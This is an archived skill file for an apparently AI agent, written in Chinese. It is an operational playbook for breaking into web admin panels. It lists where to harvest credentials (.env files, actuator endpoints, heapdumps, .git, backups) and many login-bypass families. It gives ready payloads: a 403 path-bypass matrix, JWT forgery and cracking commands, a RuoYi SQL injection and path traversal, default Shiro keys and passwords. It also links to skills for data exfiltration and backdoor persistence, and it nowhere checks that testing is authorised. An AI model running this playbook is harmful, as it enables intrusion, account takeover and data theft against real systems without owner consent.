<!-- archived from /root/.hermes/skills/security/admin-cred-and-auth-bypass/SKILL.md on 2026-10-21 -->

---
name: admin-cred-and-auth-bypass
description: "admin管理后台打不进去时用:凭据产地14类+登录绕过13族,非弱口令爆破。"
version: 1.0.0
author: hermes-curator
license: MIT
metadata:
  hermes:
    tags: [pentest, admin-panel, credential-acquisition, auth-bypass, default-credentials, jwt, actuator, cwe-306, cwe-862, surveyengine-absorbed]
    related_skills: [admin-console-discovery, sensitive-dir-credential-hunt, heapdump-credential-hunter, jwt-attacks, frontend-auth-bypass, reset-token-disclosure-ato, api-authz-idor-testing, middleware-unauth-family, cn-admin-framework-pentest, spring-boot-api-pentest, admin-backdoor-persistence, credential-stuffing, vcs-repo-exposure, vendor-doc-default-credentials, server-getshell-playbook]
---

> 归档卡：原目录 `/root/.hermes/skills/security/admin-cred-and-auth-bypass`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/admin-cred-and-auth-bypass/…')`，不要相对 `references/legacy/` 解析。

# 管理端凭据获取与登录绕过家族

## When to Use

触发: 遇到 admin / 管理端 / 运营后台 / 管理面板 / dashboard 登录页,而**账号密码未知**;
正在跑弱口令或大字典**打了好几个小时没进**;被要求"打进管理后台"。

配套(按需接力):
| 已有 | 去哪 |
|---|---|
| 管理端域名都找不到 | `admin-console-discovery`(通配证书 CT 反查 + vhost 枚举) |
| 拿到凭据要脱库 | `lowcode-admin-data-exfil` / `userdata-grab` |
| 进后台要留后门 | `admin-backdoor-persistence` |
| 拿到 JDBC/Shiro 密钥 | `java-framework-deserialization-family` / `middleware-unauth-family` |
| 卡密/发卡类后台 | `card-shop-pentest` / `open-source-faka-pentest` |

---

## 0. 心法(先立规矩,再谈技术)

1. **admin 的口令几乎从不"被猜出来",只被"读出来"或"伪造出来"。**
   在线爆破对现代后台是**结构性**走不通: bcrypt 口令 + 验证码 + 失败锁定 + IP 风控。
   大字典是**第 8 顺位**,不是第一手段。
2. **"打进去"的标准是控制权**(能调管理 API 改数据 / 拿到 shell),不是"页面进去了"。
   前端路由守卫放行后看到的是静态骨架,判定必须落在**管理 API 返回真数据**。
3. **三条判据纪律(不遵守必出假阳性/自伤)**:
   - **catch-all 基线**: 先请求一个必然不存在的路径记下长度/状态。只有**不等于基线**的响应才是候选。
     同模板多租户 SPA 对所有未知路径回同一个 `index.html`,不设基线会刷出满屏"命中"。
   - **差分判定**: 一次只改一个变量。登录成功判定 = 与"必然失败的凭据"基线响应**有差异**,
     而不是看 200(失败也常回 200)。
   - **锁定探测**: 动手前先测锁定策略(提交一次看返回)。国内后台常见"5 次锁 1 小时 / 1 天",
     盲打会把账号锁死,把"可打的窗口"变成"打不了"。
4. **先读,再猜**: `/robots.txt` `/sitemap.xml` `/api/docs` `/swagger` `/openapi.json` `/README`
   往往明文摆着路由和默认值。跳过这一步去跑 5000 条字典是最常见的时间浪费。
5. **有痕纪律**: 改库/改 admin 口令/新建超管都留痕且可能不可逆。想无痕只有一条路 ——
   **拿 JWT 签名密钥自签**。动手前先答"能不能恢复"。

---

## 1. 攻击面 × 漏洞形态 总矩阵

| 攻击面 | 漏洞形态 | 一发判据 | 利用链终点 |
|---|---|---|---|
| 部署产物(配置文件/备份/日志) | 敏感信息泄漏 CWE-538 | `GET /.env` → 200 且长度≠基线 | DB 口令 / JWT_SECRET → 自签 / 连库 |
| 运维端点(Actuator/Druid/pprof) | CWE-306 关键功能缺鉴权 | `/actuator/env` 200 | 明文口令 / heapdump 抽密钥 |
| VCS 暴露 | 源码泄露 CWE-540 | `/.git/HEAD` 200 | 远端 GitLab → 全组织仓库 |
| 登录接口 | 弱口令/默认口令 CWE-1392 | 小样本差分 | 直接进 |
| 登录接口 | 认证绕过 CWE-287 / 缺失鉴权 CWE-306 | 兄弟端点鉴权不对称 | 免口令进 |
| 会话层 | 会话固定 CWE-384 / JWT 缺陷 | 登录后 session id 是否轮换 | 构造链接让管理员带上我的会话 |
| 找回密码 | 令牌回显/不过期/可复用 | 打印**完整响应体** | 改任意账号口令 |
| 授权层 | 越权 CWE-862/639 | 换 uid 看返回 | 全量数据 / 管理员接口 |
| 前端 | 客户端强制 CWE-602 | 翻 `isAdmin/canXxx` 布尔 | 服务端不复核 → UI 控件即入口 |
| 代理/网关 | 头伪造 CWE-290 | XFF 最左值当客户端 IP | IP 白名单直进 / 限流失效 |
| 框架 | 中间件/归一化绕过 | `/admin/..;/` `%2e` 动词篡改 | 绕过滤器 |
| 主机/中间件 | 面板默认口令 / 未授权 | Tomcat manager、宝塔、1Panel | 机器 = web 目录下的 config |

---

## 2. 凭据产地 14 类

### tier1 — 直接吐凭据

| # | 产地 | 位置 | 为什么在那 | 拿到后 |
|---|---|---|---|---|
| 1 | 环境/配置 | `/.env` `.env.production` `.env.bak` `/application.yml` `/appsettings.json` `/web.config` `/config.php.bak` `/database.php` `/settings.py` `/App/Conf/config.php` `/config.js` | 部署时把 DB/JWT/APP_KEY 写这 | **JWT_SECRET → 自签 token 免登录**(无痕);DB 口令 → 连库(有痕) |
| 2 | Spring Actuator | `/actuator/env` `/actuator/httptrace`(**历史请求里的 Authorization 头 = 活 token**)/`/actuator/heapdump` `/actuator/configprops` `/actuator/mappings` `/actuator/loggers` `/jolokia/list` | Java 站运维图省事全开 | 明文口令 / 活 token / 签名密钥 |
| 3 | Druid 监控台 | `/druid/index.html` `/druid/websession.json`(会话)`/druid/datasource.json` `/druid/sql.json` `/druid/weburi.json` | 若依/芋道默认带 | 会话 / 数据源 / 全量业务 SQL |
| 4 | 日志文件 | `/storage/logs/laravel.log` `/runtime/log/` `/nohup.out` `/logs/spring.log` | 会记 `login attempt {"user":"admin","pass":"..."}` **明文** | 口令(可能是历史口令,先测复用) |
| 5 | 审计/操作日志接口 | 任意 `findList`/`auditlog`/操作日志查询 | 参数详情字段明文记 `serviceTicket`/`token`/JWT | **TTL 内换票** → 真实用户会话;见 `auditlog-ticket-harvesting` |
| 6 | VCS 暴露 | `/.git/config`(远端地址)`/.git/logs/HEAD` `/.svn/wc.db` | 提交历史常留"临时注释掉的测试口令" | 组织 GitLab → 全组织仓库;见 `vcs-repo-exposure` |
| 7 | 备份/归档 | `/web.zip` `/admin.zip` `/db.sql` `/backup.sql` `/wwwroot.rar` `/backup/` `/old/` | nginx 静态 root 直出 | admin 表 hash(先判算法) |
| 8 | 云/运维凭据 | `/.aws/credentials` `/kubeconfig` `/terraform.tfstate` `/.docker/config.json` `/.bash_history` `/.npmrc` | 部署脚本留下的 | 横向到"有权改 admin 口令的人" |

**关键认知(踩过才懂)**:
- **第 2 类的 heapdump 是终极杀器**: 内存里同时有登录态、明文口令、JWT 签名密钥。
  用对象图蜘蛛(`JDumpSpider`/蓝鸟猎手)抽,**不要只 `strings`**;但**运行时从 env 读的密钥不在堆里**,
  别在 heap strings 上无限耗时间。
- **`/actuator/httptrace` 常被忽略**: 它记的是**最近 100 条真实请求**,含 `Authorization` / `Cookie` 头 ——
  等于白送一个**管理员活 token**,比破口令快一个数量级。
- **`/actuator/loggers` 可把日志级别调到 DEBUG**,让后续登录请求的凭据进日志(改配置有痕,慎用)。
- **第 1 类的价值边界必须认清**: `.env` 常给的是 DB 口令 / JWT_SECRET / 云 AK,**不一定给后台登录口令**。
  它的真正用途是**横向**和**伪造签名**,不是直接登录。拿到 `.env` 就以为"什么都到手了"是新手误判。
- **`.env` 直读常 404/403**(nginx deny 是常态),靠 Whoops 异常页 / 日志 / 备份包兜底。

### tier2 — 不吐口令,但吐"入场券"

| # | 产地 | 拿到什么 | 关键动作 |
|---|---|---|---|
| 9 | 前端 JS bundle | `appid` + `appSecret` + **签名算法原文**(请求拦截器里) | 本地复现签名 → 网关层不再是障碍;此后**任意渠道泄漏的任意一个 token** 都能驱动管理 API |
| 10 | JS 注释/源码残留 | `// TODO: 上线前删掉 测试账号 admin/admin888` | 这种真的存在;也挖 `//` 后的连接串 |
| 11 | 未授权数据面 | 若依 `/prod-api/system/user/list`、各类 `/api/user/list` `/api/admin/list` | 用户表(hash、`resetPasswordToken`) |
| 12 | 安装向导 | `/install/` `/setup/` `/install.php` `/api/init` | 装完没删 → 直接重设管理员 |
| 13 | 分享/邀请链接 | 免登录分享页前端会自动在 `localStorage` 存 token | 抠出来 `Authorization: Bearer` 直接用 |
| 14 | 社会面(被动确认) | Play 商店页 / 官网 footer / 隐私政策页 / GitHub commit author 的邮箱 | 配"找回密码"的存在性 oracle **逐个确认**,不是猜 |
| 15 | **未鉴权验证码/短信接口** | `GET /api/getValidCodeByAdmin?loginName=<x>&user_type=2` 类 | 无鉴权下发验证码 ⇒ **账号存在性 oracle**:手机号形态回 `用户名或密码错误`(code 404)、`admin`/`root`/邮箱形态回 `code:200` ⇒ 反推有效账号与号码形态,喂给定向爆破(不要上大字典) |
| 16 | 登录接口自身的设计 | 凭据走 **GET query**:`?phone=&passwd=<REDACTED> | 密码是**客户端哈希** `SHA256(明文密码+手机号)` ⇒ **DB 里的哈希就是可直接重放的凭据**(等于明文口令的直登凭证,不用破),必须写进报告;再加 TOTP 就是"口哈希 + 手机号 + 动态码"三重门 |

**网关分层的推论(重要)**: 双层鉴权(网关层验 `appid+签名` → 应用层验用户 token)时,
用报错区分走到哪一层:
```
不带 appid -> {"msg":"appid不存在","errcode":10103}   ← 层1没过
带 appid   -> {"msg":"用户访问令牌token缺失"}            ← 层1已过,只差一个 token
```
走到第二句之后,**正确动作是转向去拿任意低权 token**(代理端/子账号端/beta 后台/前端 localStorage),
而不是继续硬攻管理端本体。

---

## 3. 登录绕过 13 族

按实战胜率排序。**第 1、2 族命中率最高,先打这两族。**

### 族1 鉴权中间件"只验 token 存在性"(CWE-862 缺失授权)
服务端只校验"这个 token 有效",**不校验它属于谁、是不是管理员**。
- 判据: 拿一个**普通用户**的 token 打管理端点;或用同一接口换 `uid`/`user_id`/`owner` 参数
- 强绑中间件会说"用户参数异常";弱中间件**直接返回他人数据** → 主战场
- 老接口常无 `/api/` 前缀(`getUserInfo`/`user_account`/`export`),先批量打这批
- 参数污染(别名/重复/大小写/浮点/数组)对强绑接口**基本无效,别耗时间**

### 族2 兄弟端点鉴权不对称(CWE-306 关键功能缺鉴权)—— 2026 最热在野形态
**同一个 handler,两个入口,只有一个挂了中间件。**
- 样板: **CVE-2026-33032 "MCPwn"(nginx-ui ≤ v2.3.3,CVSS 9.8)** ——
  MCP 路由同时挂 `/mcp`(有 `AuthRequired()`)和 `/mcp_message`(没有),
  而**做破坏性操作的那个恰恰是没鉴权的那个**。两条 HTTP 请求拿走整个 nginx:
  `POST /mcp_message?sessionId=<id>` → `nginx_config_add` + 自动 reload。
  全球约 2689 个实例公网可达;修于 v2.3.4(2026-03-15)。
  `node_secret` 本身还能经 **CVE-2026-27944**(`/api/backup` 未认证泄露)拿到。
  后利用极狠: **注入 `access_log` 指令抓取 Authorization 头 → 提取 JwtSecret → 伪造管理员 JWT**。
- 类级迁移: 见 `/api/v1/x` 就试 `/api/v2/x` `/api/internal/x` `/api/x` `/x` `/api/legacy/x`
  `/api/admin/x` `/api/x/message` `/api/x/ws`;看见"同一个功能两个端点"就怀疑其中一个漏挂。
- 同族: **CVE-2026-40976 Spring Boot 4.0.0–4.0.5(CVSS 9.1)** —— classpath 有
  `spring-boot-actuator-autoconfigure` 但缺 `spring-boot-health` 时,默认 security filter chain
  **不生成 Actuator 的授权规则**,`/actuator/env` `/heapdump` 匿名可达。**这不是配置错误,是官方默认值**。修 4.0.6。
- 同族: **@fastify/express GHSA-6hw5-45gm-fj88** —— Fastify 开 URL 归一化后未归一化就交给 Express 中间件 → 鉴权绕过。

### 族3 前端路由守卫 ≠ 鉴权(CWE-602 客户端强制)
Vue Router `beforeEach`、Angular `canActivate`、`meta:{roles:['admin']}` 全是**客户端**判断。
- 6 行探测(普通账号登录后贴 DevTools Console):
```js
const t = document.documentElement.innerHTML;
const m = t.match(/"(is[A-Z]\w+|can[A-Z]\w+|enable\w+|allow\w+)":\s*(true|false)/g) || [];
console.table(m.filter(x=>/admin|debug|internal|dev|super|test|moderat/i.test(x)).map(x=>x.replace(/[":,\s]/g," ").trim().split(" ")));
```
命中 5+ 个 `admin/debug/internal` 且全 `false` → 高度可疑(30+ 个就是年度报告)。
- 打法: Burp Match&Replace 把响应里的 `"isAdmin":false` 改成 `true`(或 `"role":"user"`→`"admin"`),
  前端渲染出管理控件 → 用那些控件发请求 → **若服务端不复核真实角色,就全通了**。
- 判定红线: **必须用 UI 触发的那个请求打到服务端并产生状态变化**才算命中,否则只是"看到了按钮"。

### 族4 JWT 伪造家族
| 形态 | 操作 | 生效条件 |
|---|---|---|
| alg=none 变体 | 去签名;试 `none` `None` `NONE` `nOnE` | 服务端未硬编码期望算法 |
| RS→HS 混淆 | 用**公钥当 HMAC 密钥**签 HS256 | 代码把 alg 取自 token(`algorithms=["RS256","HS256"]`) |
| jku/x5u/jwk 注入 | header 指向**自己的 JWKS** | 服务端信任 header 里的地址(**jku+SSRF = 关键链**) |
| kid 注入 | `kid: ../../dev/null` / `' OR 1=1--` / kid 指向自己的 JWKS | kid 拼进文件路径/SQL/JWKS URL |
| 弱密钥爆破 | `hashcat -a 0 -m 16500 jwt.txt rockyou.txt` / `jwt_tool.py <jwt> -C -d dict` | 库/示例默认密钥、短密钥、空密钥 |
| **claim 语义伪造** | 改 `sub`/`uid`/`role`/`isAdmin`/`type`/**`aud`**/**`iss`**/**`typ`** | **只验签不查归属/不校验 aud-iss-purpose** |
| 跨服务跨租户重放 | A 服务的 token 打 B 服务;refresh token 当 access token 用 | 共用签名钥、不 pin `iss`/`aud` |
| 密码版本不校验 | **改密码后旧 token 依然有效** | JWT 无状态(只有签名+exp) |
| 底层密码学 | CVE-2022-21449 "Psychic Signatures"(r=s=0 全零签名对 ES256/384/512 万能有效) | Java 15–18 |
| 密钥到手后续 | `.env`/heapdump/.git 里的 `JWT_SECRET` / JWKS 私钥 → **无限自签** | 任意文件读的下一跳 |

`jwt_tool` 常用: `-M at`(自动跑全套) `-X s`(alg 变形) `-X k`(kid 注入) `-C -d dict`(爆破) `-T`(篡改 claim)。

### 族5 找回密码令牌
一发定性(30 秒,**必须打印完整 body,只看 200 不够**):
```bash
curl -sk -X POST https://T/api/auth/forgot-password \
  -H 'Content-Type: application/json' -d '{"email":"自己的邮箱"}'
```
响应里出现任何 32/64 位随机串(`data.reset_token` / `resetLink`)→ **直通 ATO**。
变体(2026 在野确认):
- **令牌写进应用日志** → 能看日志(Docker logs / K8s pod logs / 日志聚合)的人就能接管(CVE-2026-32598)
- **未认证读 emails + reset tokens**(CVE-2026-25544 / CVE-2026-26273)
- **令牌不过期 / 可复用** → 一次性不成立,长期接管(CVE-2026-28268 Vikunja)
- 邮箱存在性 oracle: 真邮箱回 token,假邮箱回通用文案 → 单独算一条漏洞
链路: `forgot(自己)` → token → `POST /reset-password` → 登录 → 打 `/me` 取 200 才算实证。

### 族6 会话固定 / 会话不失效(CWE-384)
- 目标: **登录后 session id 是否轮换**?不轮换 → 攻击者先设一个已知 session id,
  把带它的链接发给管理员,管理员登录后该会话变成管理员会话(CVE-2026-70594 Ghost Admin、
  CVE-2026-77614 Opencast 均为同型)。
- 变体: 登出不作废;改密码不作废其它会话;同账号多会话不互踢。
- 验证标准: 攻击者手里**原样的** session id 在管理员登录后能读到管理员数据。

### 族7 HTTP 动词篡改 + 方法覆盖
- 鉴权只挂在某个动词上,而底层 handler 收全部动词: `DELETE` 被拦 → 试 `HEAD` / `OPTIONS` /
  `PUT` / `PATCH` / `GET` / `TRACE`(**XST 会回显 auth 头**)
- 覆盖头: `X-HTTP-Method-Override: PUT`(**GoogleCloudPlatform esp-v2 GHSA-6qmp-9p95-fc5f 就是 JWT 认证被它绕过**)
- `X-Method-Override`, `X-HTTP-Method`, `_method=PUT`(Laravel/Spring 的隐藏字段)

### 族8 代理头 / IP 伪造(CWE-290 伪造绕过)
只对管理端做 IP 白名单又信任这些头 → 直接进:
```
X-Forwarded-For: 127.0.0.1        X-Forwarded-For: 10.0.0.1
X-Real-IP  X-Originating-IP  X-Remote-IP  X-Client-IP  X-Remote-Addr
X-Forwarded-Host  X-Host  X-Forwarded-Server  X-Custom-IP-Authorization
```
- **限流也常按这些头记账**: 后台取 `X-Forwarded-For` 的**最左值**当客户端 IP(那是客户端可控的)→
  每次换一个值 = 无限次登录尝试(CVE-2026-84476 AVideo 信任 X-Real-IP/XFF;
  CVE-2026-27981 Homebox 认证限流绕过)。**这条能把"锁定"这个障碍直接拿掉。**
- 若依系默认把 `X-Forwarded-For` 当白名单判定依据。

### 族9 401/403 路径绕过全矩阵
反向代理/WAF 检查一种写法,后端归一化成另一种。**一次只试一个变量。**
```
/admin        → 403
/admin/       /admin/.      /admin%20   /admin%09   /admin?
/Admin        /ADMIN        /aDmIn                      ← 大小写(Windows/IIS 必试)
/%61dmin      /admi%6e      /%61%64%6d%69%6e           ← URL 编码
/%2561dmin    /admin%252f   /admin..%252f               ← 双重编码
/admi%C0%AE   /%C0%AFadmin                              ← 畸形 UTF-8(超长编码)
/./admin      //admin       /admin/./   /.//admin
/admin..;/    /admin;foo=bar  /admin;                     ← Tomcat path parameter(Java 必试)
/admin%00     /admin%00.json /%00/admin                   ← 空字节
/admin\..\/   \\.                                         ← 反斜杠(Windows)
```
再加 HTTP/1.0、Host 改 localhost、`Content-Type: application/json`、`X-Requested-With: XMLHttpRequest`。
自动化: `403bypasser` / `dirsearch`(带编码变体) / `feroxbuster`;Burp 插件 `Autorize` 跑越权矩阵。
完整矩阵见 `references/bypass-matrix-path-method-header.md`。

### 族10 中间件/运维面板自身(同机 = 进后台)
| 目标 | 默认值/洞 | 终点 |
|---|---|---|
| Tomcat | `/manager/html` `tomcat/tomcat` `admin/admin` `both/both` | 传 WAR → RCE |
| 宝塔面板 | 数据库管理页**未授权访问**(官方通告) | 直读数据库 |
| 1Panel | 未授权 RCE;XFF 绕 IP 白名单 | 写 webshell |
| CyberPanel | `/dataBases/upgrademysqlstatus` **绕 secMiddleware** | 命令执行 |
| HestiaCP | **CVE-2026-12196**(CWE-287): 低权用户改面板 cronjob 执行管理脚本(免密) | 提权接管面板 |
| cPanel/WHM | **CVE-2026-41940** 登录流认证绕过(>11.40) | 未认证进面板 |
| Core PHP Admin Panel | **CVE-2025-70758** 认证绕过 | 访问受保护页 |
| TarsWeb | **CVE-2026-80349**(CWE-290 伪造) ≤3.0.14 | 认证绕过 |
| Nacos 3.x | `/v3/auth/user/list` 未授权 | 列配置→Jasypt 解密 |
| XXL-JOB | `admin/123456` | GLUE_SHELL → RCE |
| Grafana / Jenkins / Portainer / RabbitMQ / Kibana | 默认口令 / CVE-2024-23897 | 文件读→RCE |
| Docker API / Kubelet | `2375` / `10250` | 进容器读环境变量 |

### 族11 反序列化 / RCE 直取(不用登录)
- **Shiro rememberMe(CVE-2016-4437)至今仍在打**,工具 `ShiroAttack2`:
  先发一个带随机 `rememberMe` 的请求 → 看是否回 `deleteMe` cookie 判断用没用 Shiro →
  再跑默认密钥表(见 §4 若依密钥表)> `shiro_rememberme_v124_deserialize`。
  Shiro ≥1.4.2 需勾 **AES GCM 模式**。
- Log4j2 / Fastjson / Spring4Shell / ThinkPHP RCE。
- 落 shell 后**不用登录**: 直接改库里的 admin 口令,或往 session 表塞一条自己的会话(都**有痕**)。

### 族12 CMS 插件层"参数即身份"(WordPress 系主战场)
插件把**客户端可控参数当身份依据** → 未认证接管:
- **JetFormBuilder ≤3.6.2 CVE-2026-12793**: 提交的 **form ID 未校验**是否为本站表单 →
  未认证**创建管理员账号**
- **The Events Calendar 双洞**(CVE-2026-78159 CVSS 9.8 未认证代码注入):
  未认证链可**重置管理员口令 + 执行系统命令**,60 万+ 安装
- Frontend Admin by DynamiApps CVE-2026-75816(`user-email` 字段被当凭证)
- HivePress CVE-2026-18056(`access_token` 参数即认证绕过)
- MemberDash CVE-2026-16310(`id` 参数 IDOR)
打法: 指纹插件版本(`/wp-content/plugins/<slug>/readme.txt` 的 `Stable tag`、`?ver=`)→ 映射 CVE →
优先打"未认证 + 参数即身份"。验证标准 = **最终业务状态**(用目标账号读到私有数据 / 口令被改成功)。

### 族13 GraphQL / API 契约面
- 内省开着 = 全 schema 到手: `POST /graphql {"query":"{__schema{types{name,fields{name}}}}"}`
- **内省被关也能绕**: CVE-2026-35413(Directus)/ CVE-2026-30854(Parse Server)
  —— 试 `__schema` 字段建议、`__type(name:"User")`、别名、`GET` 换 `POST`、`?query=` 传参
- 关掉内省 ≠ 关掉 mutation;schema 常从**公开的 admin 前端 chunk** 里直接反推

---

## 4. 国内后台框架专项(默认值 = 第一顺位)

### 若依 RuoYi / RuoYi-Vue / Cloud
```
弱口令: 用户 admin | ruoyi | druid   密码 123456 | admin | admin123 | admin888
指纹:   FOFA icon_hash="-1231872293" || icon_hash="706913071"
        Hunter web.body="若依后台管理系统"
未授权: /prod-api/system/user/list  (直接吐用户表含 hash)
Shiro rememberMe 默认 AES 密钥(版本对应):
  RuoYi 4.6.1–4.3.1  → zSyK5Kp6PZAAjlT+eeNMlg==
  RuoYi 3.4 及以下    → fCq+/xW488hMTCD+cmJ3aQ==
  ≥4.6.2 起改为随机密钥,拿不到密钥就无法利用
注入:   /role/list  <V4.6.2   &params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
        /dept/edit  <V4.6.2
任意文件下载: /common/download/resource?resource=/profile/../../../../etc/passwd   (RuoYi<4.5.1)
定时任务 RCE: 后台 job 管理 + 权限绕过 + 配置路径篡改(≤4.7.6 组合洞)
```
### 芋道 Yudao / GVA / Vben / Vol.Core / FastAdmin / ThinkPHP
- **芋道**: `admin/admin123`;Mock 关闭时字典可读超管 profile;`tenant-id` 头
- **GVA(gin-vue-admin)**: `admin/123456`;`/api/base/login`;注册接口→提 `authorityId`→伪造 JWT;
  CVE-2024-31457 任意代码覆盖;CVE-2026-48787(2.9.1)代码生成器方向
- **FastAdmin**: `admin/123456`;**AJ-Captcha 滑块 + 图形验证码双验证**,先破验证码再谈口令;
  `/adminlogin/ajax/lang?callback=define&controllername=index&lang=zh-cn` 泄露全部 UI 文案与错误语义;
  失败锁定语言包 `please try again after 1 day` = 锁 1 天,**爆破前先测是否已锁**
- **ThinkPHP 3/5**: 老站 `class X extends Action`(而非 `CommonAction`)= **整块无鉴权**,
  审计/黑盒都优先 grep 这个;`/index.php?s=/admin/...` 兼容路由常能绕目录级 403;
  `DEFAULT_FILTER=htmlspecialchars` 会打死字符串拼接注入,别反复换注释符
- **Vol.Core/Vue.NetCore**: JWT 弱密钥 + 表驱动 API(`{m}/{c}/{a}`)

---

## 5. 执行决策树

```
发现 admin 登录页
 ├─ 0  读: robots.txt / sitemap.xml / api/docs / swagger / openapi.json / README
 │       ← 跳过这步去跑字典 = 最常见的时间浪费
 ├─ 1  判: catch-all 基线 + 验证码类型 + 锁定策略(提交一次看返回)
 │       ← 不判基线满屏假阳性;不判锁定把账号打锁死
 ├─ 2  扫凭据产地(scripts/admin_cred_hunter.py)
 │       └─ 命中 JWT_SECRET → 自签 token,**登录这一步直接跳过(无痕)**
 │       └─ 命中 DB 口令 → 连库(有痕,先答"能不能恢复")
 │       └─ 命中 /actuator/httptrace → 管理员活 token,直接拿来用
 ├─ 3  前端 JS: 抠签名算法 + 隐藏接口 + 注释里的测试账号
 ├─ 4  找任意低权账号(代理端/自助注册/beta)→ 测它能否驱动管理 API(族1)
 ├─ 5  兄弟端点鉴权不对称(族2): 换路径/换版本/换后缀打同一个 handler
 ├─ 6  找回密码令牌回显(族5,30 秒一发)
 ├─ 7  JWT 全套(族4,纯离线不扰目标) + 会话固定(族6)
 ├─ 8  403/401 → 路径·动词·头 全矩阵(族8/族9)
 ├─ 9  兄弟域 / beta / uat / QA / dev 同款后台(通配证书下子域爆破结构性无效,走 CT 反查)
 ├─10  中间件/面板/主机层(族10/11): Tomcat manager、宝塔、Nacos、Docker API
 └─11  以上全空 —— 才轮到定向小字典;必须串行限速、先测锁定、必须先问用户(百万级大字典会被否)
```

---

## 6. 工具

### `scripts/admin_cred_hunter.py` —— 凭据来源清道夫(纯 stdlib 零依赖)
```bash
python3 scripts/admin_cred_hunter.py -u https://T/admin -o D:/渗透/T_admin
python3 scripts/admin_cred_hunter.py -u https://T/admin -o D:/渗透/T_admin \
        --probe-login --login https://T/prod-api/login     # 小样本默认口令(带锁定保护)
python3 scripts/admin_cred_hunter.py -f urls.txt -o D:/渗透/batch --threads 6
```
做什么: ①基线法剔 catch-all ②后台指纹+登录端点定位 ③154 条凭据来源路径分 tier 扫
④前端 JS 挖密(口令/密钥/云AK/JWT/内网地址/隐藏接口/注释)⑤小样本默认口令差分探测 + 锁定保护。
输出 `report.md`(按价值分层)+ `findings.json` + `js/`。

### `scripts/vuln_admin_site.py` —— 本机回归靶场
```bash
python3 scripts/vuln_admin_site.py 8899          # /admin  默认口令 admin/admin888 可进
python3 scripts/vuln_admin_site.py 8899 spa      # 未知路径一律 200 兜底(测假阳性)
# /admin2 路径带 5 次失败锁定,用于验证锁定保护
```
改动工具后**必须**跑这三个场景回归,别只跑语法检查。

---

## 7. Pitfalls

- **登录错误文案就是预言机(先拿它，再决定要不要爆破)**。同一登录端点对不同失败原因的文案往往不统一:
  - 「口令错误 / 账号不存在」→ 可枚举账号;
  - **「账号已被禁用，请联系管理员」= 口令校验已通过**⇒ 这个账号是弱口令命中，只是被禁用(实测案例正是如此);
  - 「请输入验证码」→ 已经走到验证码层，说明账号/口令都对了。
  ⇒ 先用 2-3 条已知基线(真账号+错口令、假账号+任意口令)标定文案矩阵，之后每条响应都带信息量;
  账号被禁用不是“这条路封死了”，而是“弱口令+账号残留”的证据，直接写进报告(与账号清理建议绑)。
  ⇒ 同理，注册接口重名返回「用户名已存在」= **存量用户名枚举预言机**（`admin`/`root`/`manager`/`kefu` 等），
  拿来当后续定向爆破的用户名表，而不是拿大字典硬扫。

1. **指纹/正则表里一个坏正则能让整轮崩掉**。写 `(fastadmin|/adminlogin/|?ref=addtabs)` 这种
   会把 `?` 当量词 → `re.error: nothing to repeat`,整轮 500。**每个 `re.search` 都要 try/except**,单条失败继续。
2. **入口带路径导致扫错根**。`-u https://T/admin` 时若直接拼 `+ "/.env"` 就变成 `/admin/.env`,全 404。
   **凭据面在站点根**,必须先 `urlsplit` 推出 `scheme://host` 再扫。
3. **JSON 里的 `\uXXXX` 会让关键词匹配静默失效**。国内后端(Jackson / PHP `json_encode` 默认)把中文
   转义成 `\u9501\u5b9a`,字面量 `"锁定"` 永远匹配不到 → **锁定检测报废,把"账号已锁定"误报成"候选命中"**,
   然后你拿着一个锁死的账号继续打。所有响应文本**先还义再匹配**。
4. **catch-all 200 是最大假阳性源**。同模板 SPA 对所有未知路径回同一个 `index.html`。
   不设基线就会把"注册开着""端点存在"这类结论建立在兜底页上。
5. **拿到 hash ≠ 拿到口令**。`$2a$`(bcrypt)/`$argon2` 直接放弃跑字典;只有无盐 MD5/SHA1 值得离线跑。
6. **"页面进去了" ≠ 打进去**。判定必须落在管理 API 返回真数据/状态变化。
7. **字符集白名单报错 ≠ 登录失败 ≠ 命中**。密码字段带白名单时,含 `'` `#` `@` `.` 的 payload
   返回的是**白名单报错**。看到非"密码错误"的响应**先分类再下结论**。
8. **`401` 的文案要逐字读**: 它常直接告诉你参数名(`client_id / client_secret`),省掉猜字段名的一轮。
9. **注入失败要认**: 严格类型校验 + 参数化查询是"这条路本来就不通"(Fastify+Prisma 形态),
   继续加 payload 是纯浪费,把时间全押在"找凭据"上。
10. **CSRF 419 / 连续 403 先 diff 完整请求头**。少传一个 `x-token` / `X-XSRF-TOKEN` 会伪装成"表级拒绝",
    实战踩过连续十几轮误判。
11. **QA/dev 环境别当生产**。域名含 `-qa`/`-dev`、桶名含 `-development`、种子数据是夹具 → 是夹具数据,不是真用户。
12. **改口令/改库/建超管都不可逆**。改了就还不了原口令;用户偏好无痕时不新建超管账号。
    改密码前**先拿一个新 token 存下来**(JWT 无状态 → 改回口令后它依然有效)。
13. **`.git` 探测是 WAF 高危特征**,命中即按出口 IP 打标封 30–40 分钟。判定请求放批次最后。
14. **爆破/大字典这类批量动作先问**。靶向小列表用户会给授权,百万级大字典会被否;授权后仍须低频限速、可随时停。

---

## 8. Verification

- [ ] catch-all 基线已取,且命中项的响应长度/状态**不等于**基线
- [ ] 锁定策略已实测,登录尝试数在锁定阈值以内
- [ ] 面板类命中用**最终业务状态**验证(管理 API 返回真数据 / 口令可登录),
      不是只看 200 或"页面渲染出来了"
- [ ] "只验 token 存在性"判定有**差分证据**(换 uid 前后响应不同),不是靠猜
- [ ] 源 IP / 请求头口径说明清楚(是否走代理、出口是什么)
- [ ] 有痕操作(改库/改口令/建账号)已列入报告的"痕迹与恢复"章节

---

## 支持文件

| 文件 | 内容 |
|---|---|
| `scripts/admin_cred_hunter.py` | 凭据来源清道夫(154 路径 + JS 挖密 + 差分登录探测 + 锁定保护) |
| `scripts/vuln_admin_site.py` | 回归靶场(含 SPA 兜底 / 锁定两种模式) |
| `references/2026-admin-auth-bypass-cve-map.md` | 2026 在野认证绕过 CVE 速查表(含 CVSS/版本/利用链/来源) |
| `references/credential-source-matrix.md` | 14 类凭据产地 × 精确路径 × 实测命令 × 拿到后怎么用 |
| `references/session-token-replay-from-db-backup.md` | **会话 token 直接复用**:用户表里的 `token` 列(无 TTL/无绑定/改密不失效)→ 从备份库/Parquet 取出即后台直登;含"已修复"逐入口复测矩阵、菜单口路由取证、legacy 库弱口令≠现网账号、客户端硬编码签名盐复算 |
| `references/bypass-matrix-path-method-header.md` | 401/403 路径·动词·头 全矩阵 + 限流绕过 |
